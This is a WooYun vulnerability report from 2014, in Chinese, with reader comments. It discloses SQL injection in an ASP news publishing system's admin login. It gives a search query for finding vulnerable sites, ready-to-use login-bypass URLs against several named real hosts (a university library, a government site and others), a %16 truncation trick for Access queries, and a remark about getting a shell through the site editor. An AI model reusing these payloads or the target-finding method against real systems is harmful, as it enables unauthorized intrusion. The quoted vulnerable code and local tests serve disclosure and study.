{"id": 49430, "wybug_id": "wooyun-2014-073671", "wybug_title": "某新闻发布管理系统SQL注入一枚（access数据库截断小技巧）附带拿shell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "wefgod", "wybug_date": "2014-08-25 10:12", "wybug_open_date": "2014-11-23 10:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向公众公开  简要描述： 头一次注意到access可以这样截断？ 详细说明：  搜索：http://music.google.cn/search?newwindow=1&q=inurl%3Afunonews.ASP%3FID%3D&btnG=Google+%E6%90%9C%E7%B4%A2不过有的搜索结果未必是同一套系统。系统名称应该是叫风诺新闻发布管理系统北京风诺网络开发存在注入的链接：http://lib.hebiace.edu.cn/dzb/admin/chklogin.asp?password=1&Submit=%c8%b7%20%b6%a8&admin=1   漏洞证明：  正题：当判断表名admin的时候返回密码错误，admin1的时候则提示数据库错误http://lib.hebiace.edu.cn/dzb/admin/chklogin.asp?admin=1'%20and%20exists%20(select%20*%20from%20admin)%20and%20'1'='1&password=1&Submit=%c8%b7%20%b6%a8\n\nhttp://lib.hebiace.edu.cn/dzb/admin/chklogin.asp?admin=1'%20and%20exists%20(select%20*%20from%20admin1)%20and%20'1'='1&password=1&Submit=%c8%b7%20%b6%a8\n\n用此方法也可以快速判断是否存在注入因为order by是有4个字段的，直接来吧。http://lib.hebiace.edu.cn/dzb/admin/chklogin.asp?password=1&Submit=%c8%b7%20%b6%a8&admin=1%27%20UNION%20ALL%20SELECT%20123%2CNULL%2CNULL%2CNULL%20FROM%20MSysAccessObjects%16\n\nhttp://www.botou.gov.cn/yj/admin/chklogin.asp?password=1&Submit=%c8%b7%20%b6%a8&admin=1%27%20UNION%20ALL%20SELECT%20123%2CNULL%2CNULL%2CNULL%20FROM%20MSysAccessObjects%16\n\nhttp://210.41.160.9:84/huang/nbzy/hjyj/admin/chklogin.asp?password=1&Submit=%c8%b7%20%b6%a8&admin=1%27%20UNION%20ALL%20SELECT%20123%2CNULL%2CNULL%2CNULL%20FROM%20MSysAccessObjects%16\n\nhttp://www.qzgl.cn/admin/chklogin.asp?password=1&Submit=%c8%b7%20%b6%a8&admin=1%27%20UNION%20ALL%20SELECT%20123%2CNULL%2CNULL%2CNULL%20FROM%20MSysAccessObjects%16\n\n拿shellhttp://www.qzgl.cn/webedit/admin_login.asp两个admin进入\n\n\n\n\n\n顺带简单分析一下上面的情况，因为admin=1%27%20UNION%20ALL%20SELECT%20123%2CNULL%2CNULL%2CNULL%20FROM%20MSysAccessObjects%16后面使用了一个%16，使用其它字符的话大部分都无法直接进入系统。看一下%16是个啥：\n\n看下代码：\nadmin1=request(\"admin\")password1=request(\"password\")set rs=server.CreateObject(\"ADODB.RecordSet\")sql=\"select * from admin where admin='\" & admin1 & \"' and password='\"&encrypt(password1)&\"'\"\n查询原本拼凑出来的是：select * from admin where admin=’1' UNION ALL SELECT 123,NULL,NULL,NULL FROM MSysAccessObjects （%16转换为的字符，乌云不让贴） and password=1在这个地方%16（就是）可以截断access的sql查询！等同于查询变成了：select * from admin where admin=’ 1' UNION ALL SELECT 123,NULL,NULL,NULL FROM MSysAccessObjects因为admin表结构如下：\n\n所以使用了联结查询就等于“查询出了一条数据：id=123其它字段都为空”后面部分的代码，不多说了没什么特别的\nrs.open sql,conn,1if rs.eof and rs.bof thenresponse.write\"<SCRIPT language=JavaScript>alert('用户名或密码不正确！');\"response.write\"javascript:history.go(-1)</SCRIPT>\"response.endelsesession(\"admin\")=rs(\"admin\")session(\"username\")=rs(\"admin\")session(\"userid\")=rs(\"id\")session(\"password\")=rs(\"password\")session(\"aleave\")=rs(\"aleave\")\t\t\t\tSession(\"eWebEditor_User\") = \"admin\"\t\t\t\tSession(\"eWebEditor_Version\") = \"2.8.0\"response.redirect \"admin.asp\"end ifrs.closeset rs=nothing\n本地测试下：表结构：\n\n测:1：SELECT * from admin where username='admin' and password='123';\n\n测试2（加了%16字符）：\n\n\n\n很明显后面密码的条件已经被截断了。再测试mysql：\n\n直接报错…………再测试下mssql： \n\n\n\n%16直接被忽视了所以应该只在access下有效。不知道是不是之前就有的，才疏学浅现在才知道access可以这样截断   修复方案：  过滤咯   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-08-29 16:45 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-25 10:20 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  来学习下    \n     2014-08-25 10:27 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  mark    \n     2014-08-25 10:35 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  mark    \n     2014-08-25 10:38 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2014-08-25 10:40 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  对大牛就是不一样    \n     2014-08-25 10:54 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @U神 不是大牛，大牛不发这种低级漏洞    \n     2014-08-25 11:02 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  第一次听说access截断    \n     2014-08-25 11:13 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  第一次听说，标题可以这样写    \n     2014-08-25 23:28 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  mark    \n     2014-08-27 08:59 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  哇哇哇，access？编码么。    \n     2014-08-29 17:33 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  大牛又回来了，嘿嘿 (*^__^*)     \n     2014-08-29 18:40 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:44        | 关注网络安全，提高技术！)\t\t \n  mark    \n     2014-09-01 09:14 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @梧桐雨 别大牛了，我这哪里是大牛做的事情啊    \n     2014-12-13 23:43 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  生猴子    \n     2014-12-23 00:16 |    \t\t指尖的温度 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:7        )\t\t \n  这个程序整个都有注入    \n     2015-01-24 18:27 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  @wefgod 貌似后台可以shell    \n     2015-01-25 00:03 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  用sqlmap看到过%16。。    \n     2015-01-26 10:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @ki11y0u 无所谓了，随便搞一个就OK    \n     2015-04-04 14:44 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  %16注释,哈哈    \n     2015-04-05 14:30 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  sqlmap有%16这个东西。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}